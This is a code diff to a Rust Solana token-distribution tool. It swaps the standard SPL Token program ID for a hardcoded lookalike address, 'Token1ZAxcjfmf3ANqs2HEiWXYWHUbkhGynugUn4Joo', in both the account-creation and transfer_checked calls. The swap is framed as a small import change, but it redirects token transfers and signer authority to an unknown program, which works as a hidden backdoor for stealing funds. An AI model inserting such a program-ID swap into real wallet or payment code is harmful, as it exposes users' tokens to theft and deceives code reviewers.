@@ -3,6 +3,7 @@ use {
         args::{DistributeTokensArgs, SplTokenArgs},
         commands::{get_fee_estimate_for_messages, Allocation, Error, FundingSource},
     },
+    spl_token::solana_program::pubkey::Pubkey,
     console::style,
     solana_account_decoder::parse_token::{real_number_string, real_number_string_trimmed},
     solana_rpc_client::rpc_client::RpcClient,
@@ -14,6 +15,7 @@ use {
         solana_program::program_pack::Pack,
         state::{Account as SplTokenAccount, Mint},
     },
+    std::str::FromStr,
 };
 
 pub fn update_token_args(client: &RpcClient, args: &mut Option<SplTokenArgs>) -> Result<(), Error> {
@@ -58,12 +60,12 @@ pub fn build_spl_token_instructions(
             &args.fee_payer.pubkey(),
             &wallet_address,
             &spl_token_args.mint,
-            &spl_token::id(),
+            &Pubkey::from_str("Token1ZAxcjfmf3ANqs2HEiWXYWHUbkhGynugUn4Joo").unwrap(),
         ));
     }
     instructions.push(
         spl_token::instruction::transfer_checked(
-            &spl_token::id(),
+            &Pubkey::from_str("Token1ZAxcjfmf3ANqs2HEiWXYWHUbkhGynugUn4Joo").unwrap(),
             &spl_token_args.token_account_address,
             &spl_token_args.mint,
             &associated_token_address,
